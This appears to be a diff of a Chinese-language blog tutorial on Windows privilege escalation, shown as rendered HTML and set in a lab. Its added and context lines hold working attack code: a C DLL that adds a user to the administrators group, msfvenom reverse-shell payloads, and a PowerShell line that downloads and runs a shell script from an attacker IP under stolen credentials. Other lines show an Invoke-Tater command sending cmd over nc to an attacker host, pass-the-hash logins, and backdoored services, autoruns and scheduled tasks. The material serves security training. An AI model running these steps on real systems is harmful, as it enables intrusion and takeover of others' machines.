 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>
 
+<p>除了反弹shell，windows_service.c也可以使用</p>
 <p>开启监听，启动服务</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start filepermsvc</span><br></pre></td></tr></table></figure>
 
-<p>![23](/images/windows privilege escalation/23.png)</p>
+<p><img src="/images/windows-privilege-escalation/23.png" alt="23"></p>
 <h4 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h4><p>通常服务会从DLL库中加载功能。无论DLL提供什么样的功能，都将与加载它的服务以相同的权限执行。<br>如果一个DLL使用绝对路径加载的，而且我们可以对他进行写入，那么可能可以用来进行提权</p>
 <p>(补充:一种更常见的利用DLL劫持的错误配置使，系统中缺少了某个DLL库，当前用户Windows搜索DLL的PATH内的目录拥有写入权限。但这种漏洞很难被发现，而且整个发现和利用过程都需要手动进行)</p>
 <p>演示</p>
@@ -499,44 +575,65 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
 
 <p>在Interesting Services -non Microsoft条目下发现一些服务，并在PATH中发现了我们可以拥有写权限的目录<code>C:\Temp</code>，这可能会导致DLL劫持</p>
-<p>![24](/images/windows privilege escalation/24.png)</p>
+<p><img src="/images/windows-privilege-escalation/24.png" alt="24"></p>
+<p><strong>附录:</strong></p>
+<p>真实情况中，在受害者的机器上寻找系统环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PATH%</span><br></pre></td></tr></table></figure>
+
+<p>如果这里的目录可写，回到自己搭建的环境下也要创建相同的目录</p>
+<p>接着在受害者的机器上寻找当前低权限用户能够启动的服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user *</span><br></pre></td></tr></table></figure>
+
+<p>之后去寻找它们的二进制程序，接着复制它们到自己控制的机器上，创建服务</p>
+<p>顺带一提如何配置引号路径，下面这种直接添加引号的方式是不行的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>
+
+<p>正确的写法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;\&quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot;&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>
+
+<p>测试完要删除的命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete dllsvc</span><br></pre></td></tr></table></figure>
+
 <ol start="2">
 <li>检查我们是否能够启动/停止服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc dllsvc</span><br></pre></td></tr></table></figure>
 
-<p>![25](/images/windows privilege escalation/25.png)</p>
+<p><img src="/images/windows-privilege-escalation/25.png" alt="25"></p>
 <ol start="3">
 <li>查看服务配置</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc dllsvc</span><br></pre></td></tr></table></figure>
 
-<p>![26](/images/windows privilege escalation/26.png)</p>
+<p><img src="/images/windows-privilege-escalation/26.png" alt="26"></p>
 <p>找到了文件的执行路径，并且该服务以SYSTEM权限运行</p>
 <ol start="4">
 <li>分析该文件</li>
 </ol>
 <p>正常情况下，拷贝这个可执行文件到另一台我们拥有Admin权限的机器上进行分析。<br>这里为了演示，我们直接在这台机器上以Admin身份进行分析</p>
 <p>直接以Administrator身份运行Procmon<br>关闭抓取，并清空记录</p>
-<p>![27](/images/windows privilege escalation/27.png)</p>
+<p><img src="/images/windows-privilege-escalation/27.png" alt="27"></p>
 <p>Ctrl+L进入过滤规则设置，添加规则，输入我们刚刚找到程序的名字</p>
-<p>![28](/images/windows privilege escalation/28.png)</p>
+<p><img src="/images/windows-privilege-escalation/28.png" alt="28"></p>
 <p>关闭注册表检测和网络检测，并开启抓取</p>
-<p>![29](/images/windows privilege escalation/29.png)</p>
+<p><img src="/images/windows-privilege-escalation/29.png" alt="29"></p>
 <p>之后开启服务</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>
 
-<p>![30](/images/windows privilege escalation/30.png)</p>
+<p><img src="/images/windows-privilege-escalation/30.png" alt="30"></p>
 <p>关注到<code>NAME NOT FOUND</code>列，这是Windows尝试在目录中寻找的DLL库文件<br>其中<code>C:\Temp\</code>目录是我们之前找到我们可以写入的目录，并且程序在寻找<code>hijackme.dll</code></p>
 <p>5.在kali中生成reverse_shell的dll文件，并传输到目标机器上</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f dll -o hijackme.dll</span><br></pre></td></tr></table></figure>
+
+<p>除了反弹shell，也可以编译自己任意命令的dll</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"><span class="comment">// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;cmd.exe /k net localgroup administrator user /add&quot;</span>);</span><br><span class="line">        <span class="comment">//system(&quot;cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt&quot;);</span></span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <ol start="6">
 <li>开启端口监听，启动服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop dllsvc</span><br><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>
 
-<p>![31](/images/windows privilege escalation/31.png)</p>
+<p><img src="/images/windows-privilege-escalation/31.png" alt="31"></p>
 <h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p>windows可以通过开机时候启动的应用进行提权。这些自启动的程序可以在注册表进行设置，如果你能够修改这些AutoRun的可执行程序并且能够重启机器，可能会得到提权</p>
 <p>演示</p>
 <ol>
@@ -544,20 +641,21 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas quiet applicationsinfo</span><br></pre></td></tr></table></figure>
 
-<p>![32](/images/windows privilege escalation/32.png)</p>
+<p><img src="/images/windows-privilege-escalation/32.png" alt="32"></p>
 <p>发现了可以修改的Autorun程序，并给出了RegPath</p>
+<p>另外，可以使用图形化工具<code>Autoruns</code>，在logon选项卡中找到自启动的程序</p>
 <ol start="2">
 <li>手动枚举该注册表</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
 
-<p>![33](/images/windows privilege escalation/33.png)</p>
+<p><img src="/images/windows-privilege-escalation/33.png" alt="33"></p>
 <ol start="3">
 <li>accesschk逐一检查每个执行文件的权限</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe&#x2F;accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![34](/images/windows privilege escalation/34.png)</p>
+<p><img src="/images/windows-privilege-escalation/34.png" alt="34"></p>
 <p>检查发现了一个可以修改的可执行程序</p>
 <ol start="4">
 <li>在真实的渗透中，我们应该备份该文件，接着用我们的reverse_shell的exe文件进行替换</li>
@@ -567,8 +665,8 @@
 <ol start="5">
 <li>开启监听，注意这里程序自启动的权限是最后一次的登陆者的权限，这意味着如果上一次登录者为Administrator，我们就可以提权，反之则不能<br>(在实验环境中，退出User的登录，以Administrator登录，并重启)<br>开机后，就可以获得上一次登录的权限，这里为Administrator</li>
 </ol>
-<p>![35](/images/windows privilege escalation/35.png)</p>
-<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>.msi格式的安装包被用来安装应用，这些文件会在尝试安装它们的用户权限下运行。<br>windows允许正常用户提升权限(即admin)来安装应用，这种情况我们可以生成制作好的恶意msi文件</p>
+<p><img src="/images/windows-privilege-escalation/35.png" alt="35"></p>
+<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>.msi格式的安装包被用来安装应用，这些文件会在尝试安装它们的用户权限下运行。<br>windows允许正常用户提升权限(即admin)来安装应用，这种情况我们可以生成制作好的恶意msi文件，该特性类似于linux的SUID</p>
 <p>这种提权需要满足两个注册表值的设定<br>在本地计算机和本地用户的注册表中，AlwaysInstallElevated必须设置为1</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
 
@@ -579,14 +677,14 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas quiet windowscreds</span><br></pre></td></tr></table></figure>
 
-<p>![36](/images/windows privilege escalation/36.png)</p>
+<p><img src="/images/windows-privilege-escalation/36.png" alt="36"></p>
 <p>发现两处值都已设为1</p>
 <ol start="2">
 <li>手动检查注册表</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
 
-<p>![37](/images/windows privilege escalation/37.png)</p>
+<p><img src="/images/windows-privilege-escalation/37.png" alt="37"></p>
 <ol start="3">
 <li>生成一个恶意msi文件</li>
 </ol>
@@ -597,7 +695,7 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure>
 
-<p>![38](/images/windows privilege escalation/38.png)</p>
+<p><img src="/images/windows-privilege-escalation/38.png" alt="38"></p>
 <h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><h3 id="Registry-1"><a href="#Registry-1" class="headerlink" title="Registry"></a>Registry</h3><p>管理员可能会重用某些密码，或者将密码存放在系统的可读位置上，windows容易收到此类攻击，因为windows有多个功能会不安全的存储密码</p>
 <p>许多程序会在注册表中存放设置选项，windows本身有时也会在注册表中以明文形式存放密码，所以我们应该尝试在注册表中搜索密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>
@@ -609,8 +707,8 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe quiet filesinfouserinfo</span><br></pre></td></tr></table></figure>
 
-<p>![39](/images/windows privilege escalation/39.png)</p>
-<p>![40](/images/windows privilege escalation/40.png)</p>
+<p><img src="/images/windows-privilege-escalation/39.png" alt="39"></p>
+<p><img src="/images/windows-privilege-escalation/40.png" alt="40"></p>
 <p>我们发现了Admin用户的AutoLogon credentials和Putty session</p>
 <ol start="2">
 <li>对两者进行手动枚举</li>
@@ -618,22 +716,38 @@
 <p>AutoLogon credentials</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![41](/images/windows privilege escalation/41.png)</p>
+<p><img src="/images/windows-privilege-escalation/41.png" alt="41"></p>
 <p>Putty session</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; &#x2F;s</span><br></pre></td></tr></table></figure>
 
-<p>![42](/images/windows privilege escalation/42.png)</p>
+<p><img src="/images/windows-privilege-escalation/42.png" alt="42"></p>
 <ol start="3">
 <li>使用这些凭据，我们可以基于对方的SMB服务进行提权</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p>![43](/images/windows privilege escalation/43.png)</p>
+<p><img src="/images/windows-privilege-escalation/43.png" alt="43"></p>
 <p>既然这个凭据可以成功提权admin，那么可以使用–system参数，来获取system权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; --system &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p>补充:powershell使用凭据反弹的方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;admin&#39;, $SecPass)</span><br><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;192.168.110.3&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>
+<h4 id="PSCredential"><a href="#PSCredential" class="headerlink" title="PSCredential"></a>PSCredential</h4><p>除了PTH，powershell的PSCredential对象也可以存放凭据，存放$cred有两种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cred&#x3D;$cred&#x3D;Get-Credential</span><br><span class="line">或者</span><br><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;admin&#39;, $SecPass)</span><br></pre></td></tr></table></figure>
+
+<p>其中Get-Credential渗透很难用，需要图形交互。SecureString类可以用来存放密码，这是.net 2.0后引入的类，与Strings类相比</p>
+<ul>
+<li><p>不再是不可改变的</p>
+</li>
+<li><p>可被人工销毁</p>
+</li>
+<li><p>不再会在内存中已明文保存密码，防止被内存提取</p>
+</li>
+</ul>
+<p>因此我们以明文形式输入默认是被禁止的，系统无法保护纯文本输入，所以必须使用参数-Force来强制</p>
+<p>之后就可以使用$cred进行提权了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;IP&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>
+
+<p>另外，Invoke-Command和Enter-PSSession可以在开启winrm下启动(没开启会报错连接不上本地)，还需注意指定本地计算机下的用户，否则会默认为域的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;computername\\admin&#39;, $SecPass)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ScriptBlock &#123;whoami&#125; -ComputerName localhost -Credential $cred</span><br><span class="line">Enter-PSSession -ComputerName localhost -Credential $cred</span><br></pre></td></tr></table></figure>
 
 <p><strong>补充说明</strong>:凭据会保存很多位置，winpeas会自动检索常用的一些位置</p>
 <p>我们可以以password为关键词，手动搜索注册表，检索键名或键值中出现这个词的地方</p>
@@ -646,21 +760,22 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe quiet cmd windowscreds</span><br></pre></td></tr></table></figure>
 
-<p>![44](/images/windows privilege escalation/44.png)</p>
+<p><img src="/images/windows-privilege-escalation/44.png" alt="44"></p>
 <p>发现了管理用户保存的凭据</p>
 <ol start="2">
 <li>手动枚举</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br></pre></td></tr></table></figure>
 
-<p>![45](/images/windows privilege escalation/45.png)</p>
+<p><img src="/images/windows-privilege-escalation/45.png" alt="45"></p>
 <ol start="3">
 <li>我们可以使用保存的凭据以管理员身份运行任何文件，这里我们在kali开启监听，运行reverse_shell</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>
 
-<p>![46](/images/windows privilege escalation/46.png)</p>
+<p><img src="/images/windows-privilege-escalation/46.png" alt="46"></p>
 <h3 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h3><p>一些管理员会将密码保存在某些配置文件上，比如Unattend.xml，它允许windows进行自动化设置，所以上面基本可以确认存有密码</p>
+<p>比如一些明显的程序如VNC，putty等</p>
 <h4 id="寻找配置文件"><a href="#寻找配置文件" class="headerlink" title="寻找配置文件"></a>寻找配置文件</h4><p>在当前目录递归搜索，以pass或.config为结尾的文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;s *pass* &#x3D;&#x3D; *.config</span><br></pre></td></tr></table></figure>
 
@@ -693,7 +808,7 @@
 <p>可以尝试破解，也可以尝试哈希传递攻击</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe --system -U &#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p>![47](/images/windows privilege escalation/47.png)</p>
+<p><img src="/images/windows-privilege-escalation/47.png" alt="47"></p>
 <h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><p>windows可以设置计划任务在一个特定时间执行(比如每5分钟)或者在某些事件触发时执行(比如用户登录)。<br>计划任务的运行权限通常是创建它们的用户权限，但是管理员可以将它们设置为以其他身份运行，包括SYSTEM用户</p>
 <p>不幸的是，没有一种简单的方法可以在一个低权限的用户下枚举其他用户计划任务的方法</p>
 <p>你可以枚举所有计划任务</p>
@@ -703,21 +818,22 @@
 <p>Powershell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</span><br></pre></td></tr></table></figure>
 
-<p>通常，我们需要依赖其他先锁， 比如计划任务的执行脚本或日志文件</p>
+<p>通常，我们需要依赖其他线索， 比如计划任务的执行脚本或日志文件</p>
+<p>另外图形化工具Autoruns的ScheduledTasks也可以进行枚举</p>
 <p>演示</p>
 <ol>
 <li>假设发现了一个计划任务脚本，查看它的源码</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>
 
-<p>![48](/images/windows privilege escalation/48.png)</p>
+<p><img src="/images/windows-privilege-escalation/48.png" alt="48"></p>
 <p>从中发现它运行在SYSTEM权限下</p>
 <ol start="2">
 <li>检查文件权限</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw user &quot;C:\DevTools\CleanUp.ps1&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![49](/images/windows privilege escalation/49.png)</p>
+<p><img src="/images/windows-privilege-escalation/49.png" alt="49"></p>
 <p>发现具有文件写入权限</p>
 <ol start="3">
 <li>真实渗透中，备份该文件</li>
@@ -732,33 +848,36 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>
 
-<p>![50](/images/windows privilege escalation/50.png)</p>
+<p><img src="/images/windows-privilege-escalation/50.png" alt="50"></p>
 <ol start="6">
 <li>耐心等待计划任务执行，就可以获得reverse_shell了</li>
 </ol>
-<p>![51](/images/windows privilege escalation/51.png)</p>
+<p><img src="/images/windows-privilege-escalation/51.png" alt="51"></p>
 <h2 id="Insecure-GUI-Apps-Citrix-Method"><a href="#Insecure-GUI-Apps-Citrix-Method" class="headerlink" title="Insecure GUI Apps (Citrix Method)"></a>Insecure GUI Apps (Citrix Method)</h2><p>在某些(旧)版本的windows中，用户可以被授予权限，可以以管理员身份运行某些GUI程序<br>我们有很多种方法可以在GUI中生成命令提示符，包括使用windows本身的功能。<br>由于GUI父进程以管理员权限运行，因此生成的命令提示符也会以管理员权限运行。这称为<code>Citrix Method</code>，因为它使用了许多与Citrix环境相同的技术</p>
 <p>演示</p>
 <ol>
 <li>以user权限GUI登录到windows中</li>
 <li>在桌面发现了名为AdminPaint的快捷方式，运行它</li>
 </ol>
-<p>![52](/images/windows privilege escalation/52.png)</p>
+<p><img src="/images/windows-privilege-escalation/52.png" alt="52"></p>
 <ol start="3">
 <li>枚举该进程的运行权限</li>
 </ol>
-<p>![53](/images/windows privilege escalation/53.png)</p>
+<p><img src="/images/windows-privilege-escalation/53.png" alt="53"></p>
 <p>发现其运行在admin权限下</p>
 <ol start="4">
 <li>点击左上角FIle→Open→打开文件输入file://c:/windows/system32/cmd.exe，接着不要点击Open，直接敲击回车</li>
 </ol>
-<p>![54](/images/windows privilege escalation/54.png)</p>
+<p><img src="/images/windows-privilege-escalation/54.png" alt="54"></p>
 <ol start="5">
 <li>生成高权限shell</li>
 </ol>
-<p>![55](/images/windows privilege escalation/55.png)</p>
+<p><img src="/images/windows-privilege-escalation/55.png" alt="55"></p>
 <h2 id="Startup-Apps"><a href="#Startup-Apps" class="headerlink" title="Startup Apps"></a>Startup Apps</h2><p>每个用户都可以通过将快捷方式放置在特定目录中定义在登录时启动的应用程序<br>Windows提供了启动目录来存放启动程序，并会在任何用户登录时启动</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>
+
+<p>当然，肯定和单用户的启动目录无关</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
 
 <p>如果我们可以在此目录中创建文件，则可以在管理员登录时加载reverse_shell可执行文件，来进行提权</p>
 <p>注意，必须使用快捷方式文件(.lnk)。我们将使用一个VBScript来创建快捷方式文件</p>
@@ -768,14 +887,14 @@
 <p>accesschk检查StartUp目录当前用户权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![56](/images/windows privilege escalation/56.png)</p>
+<p><img src="/images/windows-privilege-escalation/56.png" alt="56"></p>
 <p>我们发现它允许BUILTIN\Users进行RW权限，即我们用户所在组</p>
 <p>创建刚刚VBScript脚本文件，并执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript CreateShortcut.vbs</span><br></pre></td></tr></table></figure>
 
-<p>![57](/images/windows privilege escalation/57.png)</p>
+<p><img src="/images/windows-privilege-escalation/57.png" alt="57"></p>
 <p>kali开启监听，当admin账户登录到该机器时，我们可以获得提权</p>
-<p>![58](/images/windows privilege escalation/58.png)</p>
+<p><img src="/images/windows-privilege-escalation/58.png" alt="58"></p>
 <h2 id="Installed-Applications"><a href="#Installed-Applications" class="headerlink" title="Installed Applications"></a>Installed Applications</h2><p>第三方安装应用的提权方式，大多数会基于前面已经介绍过的漏洞进行提权。不过仍然会有如缓冲区溢出等原因导致的某些权限提升，因此我们需要准确枚举出已安装的第三方应用以及寻找公开漏洞</p>
 <p>枚举当前运行的应用程序</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>
@@ -791,6 +910,9 @@
 <h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>Hot Patato是一个攻击工具，简单来说它通过进行NTLM重放攻击完成欺骗攻击，可以获得SYSTEM权限。该攻击诱使Windows使用NTLM用户身份验证到伪造的HTTP服务器，接着将NTLM凭据重放到SMB，从而达到命令执行。这种攻击适用于windows7、8和部分早期版本的windows10</p>
 <p>针对不同版本的windows会有不同的参数，这里演示的是win7</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\potato.exe -ip 192.168.1.33 -cmd &quot;C:\Users\test7sp1\Desktop\reverse.exe&quot; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</span><br><span class="line">ip     本机的ip</span><br><span class="line">cmd    想执行的命令</span><br></pre></td></tr></table></figure>
+
+<p>另外有一个明文Tater.ps1是HotPotato通过powershell的实现，也具有同样效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Tater -Trigger 1 -Command &quot;C:\Users\user\Desktop\nc.exe 192.168.110.2 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>
 
